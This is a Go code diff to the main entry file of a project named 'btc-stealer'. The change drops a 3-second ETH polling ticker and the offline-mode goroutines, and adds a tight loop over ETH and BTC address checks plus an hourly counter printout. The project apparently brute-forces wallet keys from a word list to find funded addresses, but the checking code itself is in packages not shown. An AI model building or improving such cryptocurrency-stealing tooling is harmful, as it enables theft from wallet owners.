@@ -1,12 +1,14 @@
 package main
 
 import (
+	"encoding/json"
+	"fmt"
+	"os"
+	"time"
+
 	"btc-stealer/btc"
 	"btc-stealer/common"
 	"btc-stealer/eth"
-	"encoding/json"
-	"os"
-	"time"
 )
 
 func init() {
@@ -23,24 +25,18 @@ func init() {
 
 	common.InitConfig(&cfg)
 	common.SetWords(cfg.WordsList)
-}
 
-// RunETHCheck through debugging, we found that the average request response is about 1 second. So set the execution period to 3 seconds
-func RunETHCheck() {
-	ticker := time.NewTicker(time.Second * 3)
-	for range ticker.C {
-		eth.AddressETHCheck()
-	}
+	go func() {
+		ticker := time.NewTicker(time.Hour)
+		for range ticker.C {
+			fmt.Println(time.Now(), "btc:", common.BTCCount(), "eth:", common.ETHCount())
+		}
+	}()
 }
 
 func main() {
-
-	go eth.RunETHOfflineCheck()
-	go btc.RunBTCOfflineCheck()
-
-	if common.GetMode() == common.ModeOffline {
-		select {}
+	for {
+		eth.AddressETHCheck()
+		btc.AddressBTCCheck()
 	}
-
-	RunETHCheck()
 }
